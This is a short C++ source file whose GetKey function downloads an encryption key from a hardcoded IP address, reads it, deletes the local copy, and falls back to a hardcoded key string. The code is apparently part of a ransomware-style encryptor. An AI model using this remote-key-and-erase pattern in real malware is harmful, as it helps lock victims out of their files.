#include "stdafx.h"
#include "HTTP.h"

//Gets encryption key from server
std::string HTTP::GetKey(std::wstring &path)
{
	std::wstring fullPath = path + L"\\key";
	//Downloads the key from my site
	HRESULT hres = URLDownloadToFile(NULL, L"http://164.132.25.185/key.php",  fullPath.c_str(), 0, NULL);

	if (FileIO::fileExists(fullPath))
	{
		//reads the key into memory
		std::string key = FileIO::readFile(fullPath).at(0);
		//Deletes the file containing the key
		FileIO::removeFile(fullPath);
		//Returns the key
		return key;
	}
	//Returns this key if connection to server fails
	return "GuBlZEpxPFqDAtjNh7c6mKs4Iy9Mrfw2UYvn3ei5HTgaO1dCbz8QXLJk0RVoW";
}
